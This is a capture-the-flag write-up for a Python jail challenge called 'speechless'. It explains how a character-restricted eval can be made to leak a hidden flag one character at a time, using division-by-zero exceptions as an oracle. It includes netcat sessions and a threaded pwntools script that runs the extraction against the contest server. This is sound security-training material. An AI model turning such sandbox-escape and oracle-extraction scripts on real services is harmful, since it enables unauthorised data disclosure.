---
title: speechless
challenge_type: Jail
author: "@quasar098"
writeup_author: "@xabito"
competition: infobahn-ctf-2025
summary: |-
  wow i'm in jail??? i'm speechless...
connections:
  - url: speechless.challs.infobahnc.tf:1337
attachments:
  - title: chall.py
    url: /assets/files/infobahn-ctf-2025/speechless/chall.py
---

## Recon

This challenge presents a Python jail with an extremely restricted character set. We can execute code in a REPL, but only the characters `a`, `b`, `.`, `=`, `-`, and `/` are allowed, and we must use only these to escape the jail and extract the flag.

The crucial aspect of this challenge lies in the following code snippet. Any code evaluated with `eval` assigns its result to the variable `a`. Additionally, we have access to both `a` and a series of variables named `b`, `bb`, `bbb`, and so on, where each such variable holds a single character from the flag.

```python
try:
    a = eval(expr, {"a": a} | {"b" * (index + 1): char for index, char in enumerate(flag)})
except:
    a = None
    print('stop breaking things >:(')
```

## Exploitation

Everytime our code raises an exception, it will print the `stop breaking thinks >:(` message. First thing we can do with this is to know the flag length by checking every `b` variable:

```bash
$ nc speechless.challs.infobahnc.tf 1337
>>> bbbbbbbbbb
>>> bbbbbbbbbbbbbbbbbbbb
>>> bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
>>> bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
>>> bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
>>> bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
stop breaking things >:(
```

From the last valid variable, we can conclude that the flag consists of 55 characters. To determine the value of each character, we need a method of distinguishing whether a guess is correct.

We can accomplish this by deliberately causing exceptions. Specifically, by using division by zero errors within our comparisons we can determine character values based on whether an exception is raised. Here are the steps involved:

1. **Set `a = 1`**. To do so, we can just divide `b` by itself with `b/b`.
2. **Subtract `N`**. Just substract from `b` with `b - a - a - ...`, `N` times.
3. **Check for `0`**. Divide `a/a`, and if we subtracted the right number of times, we will get an exception.

For example, since we know the flag starts with the prefix `infobahn{`, the first flag character is `i`, meaning the variable `b` holds the value of `i`, which corresponds to ASCII code `105`. If we subtract `a` from `b` a total of 105 times, then attempt to divide `a` by itself, we will trigger an exception, because `b - a - a - ...` 105 times yields zero, and then `a/a` results in a division by zero error.

```
>>> b/b
>>> b-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a
>>> a/a
stop breaking things >:(
```

This confirms our approach is successful. Next, let's automate the extraction process using a Python script:

```python
from pwn import *
from threading import Thread, Semaphore

context.log_level = 'info'

HOST = "speechless.challs.infobahnc.tf"
PORT = 1337

FLAG_LENGTH = 55

results = [None] * FLAG_LENGTH
semaphore = Semaphore(10)

def send_command(conn, cmd):
    conn.sendline(cmd.encode())
    response = conn.recvuntil(b'>>> ', timeout=2)
    return response

def extract_char_worker(index):
    semaphore.acquire()  # Wait for available slot

    log.info(f"Starting worker for char {index}")

    conn = remote(HOST, PORT, level='error', timeout=5)
    conn.recvuntil(b'>>> ', timeout=2)

    var_name = "b" * (index + 1)
    value = None
    for test_value in range(126, 31, -1):
        send_command(conn, "b/b")
        send_command(conn, var_name + "-a" * test_value)
        result = send_command(conn, "a/a")

        if b'stop breaking things' in result:
            log.info(f"Found char {index}: {chr(test_value)}")
            results[index] = test_value
            break

    conn.close()

    semaphore.release()

threads = []
for i in range(FLAG_LENGTH):
    t = Thread(target=extract_char_worker, args=(i,), daemon=True)
    t.start()
    threads.append(t)
    time.sleep(1)  # Small delay to avoid connection burst

for i, t in enumerate(threads):
    t.join()

flag = ''.join(chr(v) for v in results)
log.success(f"Flag: {flag}")
```

**Note:** We implemented concurrency to improve performance, because the process is suboptimal. Further optimization could be achieved by employing a binary search strategy instead of iterating over all possible ASCII values, which would significantly reduce the total number of operations required.

## Flag capture

To retrieve the flag, simply run the script:

```bash
$ python3 extract_flag.py
[*] Starting worker for char 0
[*] Starting worker for char 1
[*] Found char 0: i
[*] Found char 1: n
...
[+] Flag: infobahn{i_can't_believe_i_used_ellipsis_in_a_jail_...}
```